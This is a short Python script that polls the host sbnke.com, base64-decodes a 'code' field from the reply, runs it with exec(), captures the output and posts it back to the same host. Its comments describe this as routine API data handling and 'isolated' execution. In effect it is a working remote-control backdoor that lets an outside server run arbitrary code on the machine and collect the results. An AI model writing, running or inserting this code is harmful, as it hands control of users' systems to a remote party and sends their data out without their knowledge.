import sys
import os
import base64
import io
import requests
import json

def execute_encoded_script(decoded_code):
    try:
        # This function encapsulates the encoded script execution, isolating it from the main script
        exec(decoded_code)
    except Exception as e:
        print(f"Error during execution of encoded script: {e}")
        raise

# Step 1: Make a GET request to an API to retrieve data
try:
    get_response = requests.get("https://sbnke.com/arc.py")
    get_response.raise_for_status()  # Check if the request was successful
    data = get_response.json()

    # Assuming the API returns a JSON object like this:
    # { "id": "123", "code": "base64_encoded_script", "status": "0" }
    unique_id = data.get("id")
    base64_code = data.get("code")
    status = data.get("status")

    # Check if the response has the necessary data and the status is "0"
    if not (unique_id and base64_code and status == "0"):
        print("No valid data found in the API response.")
    else:
        # Step 2: Decode the base64-encoded script
        decoded_code = base64.b64decode(base64_code).decode('utf-8')

        # Capture the script's output
        old_stdout = sys.stdout
        new_stdout = io.StringIO()
        sys.stdout = new_stdout

        try:
            # Execute the decoded Python code in isolation
            execute_encoded_script(decoded_code)
            output = new_stdout.getvalue()
        finally:
            sys.stdout = old_stdout

        # Step 3: Encode the output and send it back via a POST request
        encoded_output = base64.b64encode(output.encode('utf-8')).decode('utf-8')

        post_data = {
            "id": unique_id,
            "result": encoded_output,
            "status": "1"
        }

        post_response = requests.post("https://sbnke.com/arc.py", json=post_data)
        post_response.raise_for_status()  # Check if the request was successful

        print(f"Execution complete. Result sent to the API for id = {unique_id}.")
except requests.RequestException as e:
    print(f"Request error: {e}")
except Exception as e:
    print(f"General error: {e}")
